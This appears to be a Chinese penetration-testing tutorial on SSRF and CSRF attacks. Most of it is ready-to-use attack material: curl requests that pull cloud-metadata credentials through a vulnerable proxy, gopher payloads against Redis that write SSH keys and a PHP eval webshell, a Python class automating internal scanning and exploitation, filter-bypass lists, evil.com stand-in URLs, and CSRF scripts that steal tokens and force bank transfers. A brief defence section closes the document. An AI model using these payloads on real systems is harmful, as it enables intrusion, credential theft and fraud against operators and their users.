# 渗透测试战术：SSRF 攻击与 CSRF 跨站请求伪造深度实战

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：渗透测试

## 📋 提纲

1. SSRF 漏洞原理
2. SSRF 利用场景与技巧
3. SSRF 绕过防火墙与协议
4. SSRF 在内网渗透中的应用
5. CSRF 漏洞原理与利用
6. CSRF Token 绕过技术
7. 防御方案

---

## 1. SSRF 漏洞原理

SSRF(Server-Side Request Forgery)：服务端请求伪造——让服务端替你访问内网资源。

```
攻击者 → Web服务器 → 内网资源(Redis/MySQL/Metadata/AWS/Aliyun元数据)

利用场景：
1. 访问内网服务（Redis/MySQL/Elasticsearch）
2. 读取云元数据（AWS/阿里云/腾讯云）
3. 端口扫描内网
4. 读取本地文件(file://)
5. 利用Gopher协议攻击内网服务
```

### 1.1 常见触发点

```
1. URL获取功能
   ?url=http://evil.com  (图片代理/URL预览/网页截图)

2. 文件导入
   ?file=http://evil.com/shell.php  (远程文件包含)

3. Webhook/回调
   ?callback=http://evil.com

4. API集成
   请求体中含URL参数
```

---

## 2. SSRF 利用技巧

### 2.1 云元数据读取

```bash
# AWS EC2 元数据
curl "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"
curl "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://target.com/proxy?url=http://169.254.169.254/latest/user-data/"

# 阿里云 ECS 元数据
curl "http://target.com/proxy?url=http://100.100.100.200/latest/meta-data/"
curl "http://target.com/proxy?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/"

# 腾讯云 CVM 元数据
curl "http://target.com/proxy?url=http://metadata.tencentyun.com/latest/meta-data/"
```

### 2.2 协议利用

```bash
# file:// 协议 - 读取本地文件
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
?url=file:///var/www/html/config.php

# dict:// 协议 - 探测端口
?url=dict://127.0.0.1:6379/info    # Redis
?url=dict://127.0.0.1:3306/        # MySQL

# gopher:// 协议 - 攻击内网服务
# 攻击 Redis (未授权访问)
?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$5%0d%0ahello%0d%0a
# 降级为: SET test hello

# 通过Redis写入SSH公钥
?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$...<public_key>...%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 2.3 绕过SSRF限制

```python
#!/usr/bin/env python3
"""SSRF 绕过技巧"""

BYPASS_TECHNIQUES = {
    # 1. IP限制绕过
    "ip_encoding": {
        "127.0.0.1": [
            "2130706433",           # 十进制
            "0x7f000001",          # 十六进制
            "0x7f.0x00.0x00.0x01", # 混合
            "0177.0.0.1",          # 八进制
            "127.0.0.1.nip.io",    # nip.io 泛域名解析
            "127.1",               # 短格式
        ],
        "localhost": [
            "localhost",
            "[::1]",               # IPv6
            "0.0.0.0",
            "127.127.127.127",
            "0177.0177.0177.0177",
        ]
    },

    # 2. URL限制绕过
    "url_encoding": [
        "http://evil.com@127.0.0.1",           # @符号混淆
        "http://127.0.0.1#@evil.com",          # #注释
        "http://evil.com%23@127.0.0.1",        # URL编码#
        "http://127.0.0.1%20@evil.com",        # 空格
        "http://127.0.0.1:80@evil.com",        # 端口@域名
    ],

    # 3. 重定向绕过
    "redirect": [
        "让evil.com 302跳转到 127.0.0.1",
    ],

    # 4. DNS重绑定
    "dns_rebinding": [
        "使用DNS TTL=0，第一次解析为合法IP，第二次解析为127.0.0.1",
    ],
}

def generate_ssrf_payloads(target_internal="127.0.0.1", port=6379):
    payloads = []

    # 基础payloads
    payloads.append(f"http://{target_internal}:{port}/")

    # 十进制IP
    ip_parts = target_internal.split('.')
    decimal_ip = int(ip_parts[0])*256**3 + int(ip_parts[1])*256**2 + int(ip_parts[2])*256 + int(ip_parts[3])
    payloads.append(f"http://{decimal_ip}:{port}/")

    # 十六进制
    hex_ip = '0x' + ''.join(f'{int(p):02x}' for p in ip_parts)
    payloads.append(f"http://{hex_ip}:{port}/")

    # DNS重绑定
    payloads.append(f"http://{target_internal}.nip.io:{port}/")

    return payloads
```

---

## 3. SSRF 内网利用链

```python
#!/usr/bin/env python3
"""SSRF → 内网服务攻击自动化"""

class SSRFInternalExploit:
    def __init__(self, ssrf_endpoint):
        self.endpoint = ssrf_endpoint

    def scan_internal_ports(self, ip_range="10.0.0.0/24", ports=[22,6379,3306,9200,27017]):
        """通过SSRF扫描内网端口"""
        results = []
        # 通过响应时间/内容差异判断端口是否开放
        for port in ports:
            payload = f"http://{ip_range.split('/')[0].rsplit('.',1)[0]}.1:{port}/"
            resp = self.send_ssrf(payload)
            results.append({"target": f"{ip_range}:{port}", "open": resp.get('status') != 'timeout'})
        return results

    def exploit_redis(self, internal_ip):
        """通过SSRF攻击内网Redis"""

        # 1. 写入WebShell到/var/www/html/
        webshell = '<?php @eval($_POST["cmd"]);?>'
        payload = f"gopher://{internal_ip}:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0ashell%0d%0a${self.url_encode(webshell)}%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
        return self.send_ssrf(payload)

    def exploit_mysql(self, internal_ip):
        """通过SSRF攻击内网MySQL"""
        # Gopher协议构造MySQL认证包
        # 前提：MySQL允许任意主机连接
        pass

    def send_ssrf(self, payload):
        import requests
        try:
            resp = requests.post(self.endpoint, data={"url": payload}, timeout=10)
            return {"status": "ok", "response": resp.text[:200]}
        except:
            return {"status": "timeout"}
```

---

## 4. CSRF 漏洞原理

CSRF：诱导受害者点击链接→以受害者身份执行非本意操作。

```
攻击者诱导受害者点击：
<img src="http://bank.com/transfer?to=attacker&amount=10000">
→ 受害者浏览器自动发出请求（带上bank.com的Cookie）
→ 转账成功
```

### 4.1 CSRF Token 绕过

```html
<!-- 方法1: 通过XSS窃取Token -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/profile', true);
xhr.onload = function() {
    var token = xhr.responseText.match(/csrf_token" value="([^"]+)"/)[1];
    // 盗取token后发起CSRF攻击
    document.write('<img src="/transfer?to=attacker&amount=10000&token='+token+'">');
};
xhr.send();
</script>

<!-- 方法2: Token未与Session绑定 -->
<!-- 有些系统Token是固定的，攻击者获取自己的Token即可用于攻击其他人 -->

<!-- 方法3: 修改请求方法绕过 -->
<!-- 如果POST有Token但GET没有 -->
<img src="/transfer?to=attacker&amount=10000">

<!-- 方法4: JSON格式绕过 -->
<!-- 如果服务端同时接受form-urlencoded和JSON -->
<script>
fetch('/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to:'attacker', amount:10000})
});
</script>
```

---

## 5. 防御方案

**SSRF防御**：
```python
# 服务端URL白名单
ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']

def validate_url(url):
    parsed = urlparse(url)
    
    # 只允许HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    # 白名单域名
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
    
    # 禁止内网IP
    import ipaddress
    ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("Internal IP blocked")
```

**CSRF防御**：
```python
# 1. SameSite Cookie
Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly

# 2. CSRF Token
<form>
    <input type="hidden" name="csrf_token" value="{{ random_token_per_session }}">
</form>

# 3. Origin/Referer 校验
if request.headers.get('Origin') not in ALLOWED_ORIGINS:
    return 403
```

---

## ✅ SSRF + CSRF Checklist

- [ ] SSRF检测：所有URL/Fetch/Import功能点
- [ ] SSRF绕过：IP编码/DNS重绑定/重定向
- [ ] 内网元数据访问测试
- [ ] CSRF：所有状态变更操作(转账/修改密码/删除)
- [ ] CSRF Token生成与验证机制审计

> 📚 延伸阅读：Penetration/001-Web流程 | Penetration/003-SQL注入 | CodeAudit/001-PHP审计
